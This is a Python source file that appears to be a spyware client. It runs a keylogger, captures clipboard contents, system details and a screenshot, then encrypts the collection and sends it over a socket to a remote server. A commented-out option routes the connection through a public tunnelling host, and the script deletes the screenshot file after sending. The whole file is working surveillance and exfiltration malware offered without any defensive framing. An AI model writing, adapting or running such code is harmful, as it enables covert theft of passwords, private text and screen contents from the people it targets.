import socket
import json
import time
import threading
import pyperclip
import pyautogui
import os
import platform
from pynput import keyboard
from encryption_utils import encrypt

SERVER_IP = '192.168.1.10'  # replace with your server IP
PORT = 9999

# SERVER_IP = 'serveo.net'
# PORT = 45678


data = {
    "Keys": [],
    "Clipboard": "",
    "System Info": "",
    "Screenshot Path": ""
}

# --- Keylogger ---
def on_press(key):
    try:
        data["Keys"].append(key.char)
    except AttributeError:
        data["Keys"].append(str(key))

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# --- Clipboard ---
def capture_clipboard():
    try:
        clipboard_data = pyperclip.paste()
        data["Clipboard"] = clipboard_data
    except:
        data["Clipboard"] = "Clipboard access failed"

# --- System Info ---
def capture_system_info():
    sys_info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor()
    }
    data["System Info"] = sys_info

# --- Screenshot ---
def take_screenshot():
    screenshot = pyautogui.screenshot()
    filename = f"screenshot_{int(time.time())}.png"
    screenshot.save(filename)
    data["Screenshot Path"] = filename
    return filename

# --- Send to Server ---
def send_data():
    try:
        s = socket.socket()
        s.connect((SERVER_IP, PORT))

        # Prepare full data (including screenshot)
        send_dict = data.copy()

        if os.path.exists(send_dict["Screenshot Path"]):
            with open(send_dict["Screenshot Path"], "rb") as f:
                screenshot_bytes = f.read()
            send_dict["Screenshot"] = screenshot_bytes.hex()
        else:
            send_dict["Screenshot"] = "Screenshot not found"

        # Encrypt and send
        encrypted_data = encrypt(json.dumps(send_dict))
        s.send(encrypted_data.encode())
        ack = s.recv(1024).decode()
        print(f"[Server Reply] {ack}")
        s.close()
    except Exception as e:
        print(f"[Error] Could not send data: {e}")

# --- Main Execution ---
if __name__ == "__main__":
    start_keylogger()
    capture_clipboard()
    capture_system_info()
    screenshot_file = take_screenshot()

    print("[Client] Logging for 10 seconds...")
    time.sleep(10)  # Collect keystrokes for 10 seconds

    send_data()

    # Optional: delete screenshot after sending
    if os.path.exists(screenshot_file):
        os.remove(screenshot_file)









